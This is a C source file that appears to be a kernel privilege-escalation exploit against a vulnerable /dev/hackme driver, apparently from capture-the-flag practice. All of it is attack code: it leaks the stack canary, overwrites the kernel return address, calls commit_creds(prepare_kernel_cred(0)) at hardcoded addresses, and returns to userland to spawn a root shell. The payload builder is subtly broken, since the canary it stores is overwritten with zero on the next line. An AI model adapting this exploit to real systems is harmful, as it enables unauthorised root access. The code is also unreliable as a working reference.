// ffffffff814c6410 T commit_creds
// ffffffff814c67f0 T prepare_kernel_cred
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>


void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long userr_rip = (unsigned long)get_shell;

int dev_fd;
void device_open(){
    dev_fd = open("/dev/hackme",O_RDWR);
	if (dev_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} 
    else 
        puts("[*] Device opened");
}
unsigned long cookie;
void leak_canary(){
    unsigned long leak[20];
    read(dev_fd, leak, sizeof(leak));
    cookie = leak[16];

    printf("[*] Leaked Cookie: %lx\n", cookie);
}

unsigned long userr_cs, userr_ss, userr_rflags, userr_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov userr_cs, cs;"
        "mov userr_ss, ss;"
        "mov userr_sp, rsp;"
        "pushf;" //copy the flag register at the top of the stack.
        "pop userr_rflags;"
        ".att_syntax;"
    );
}

// commit_cred(struct cred *)
// *cred prepare_kernel_cred(struct task_struct *reference_task_struct)
//commit_cred(prepare_kernel_cred(0)
void escalate_privileges(){
    __asm__(
                ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
         //gs register points to the current task struct
        "swapgs;"
        //push registers value back to stack before returning to userland
        "mov r15, userr_ss;"
        "push r15;"
        "mov r15, userr_sp;"
        "push r15;"
        "mov r15, userr_rflags;"
        "push r15;"
        "mov r15, userr_cs;"
        "push r15;"
        "mov r15, userr_rip;"
        "push r15;"
        "iretq;"  // The iretq instruction just requires the stack to be setup with 5 userland register values in this order: RIP|CS|RFLAGS|SP|SS.
        ".att_syntax;"
    );
}

void overwrite_returnaddress(){
    unsigned long payload[30];
    unsigned off = 16;
    payload[off] = cookie;
    payload[off++] = 0; //rbx
    payload[off++] = 0; //r12
    payload[off++] = 0; //rbp
    payload[off++] = (unsigned long)escalate_privileges;
    puts("[*] Writing Payload on kernel stack");

    write(dev_fd, payload, sizeof(payload));

    puts("[*] Payload written");
}





int main(){
    puts("[*] Opening /dev/hackme");
    device_open();
    save_state();
    puts("[*] State saved");
    leak_canary();
    puts("[*] Canary leaked");
    overwrite_returnaddress();
    puts("[!] RIP - Should never be reached");
    return 0;
}
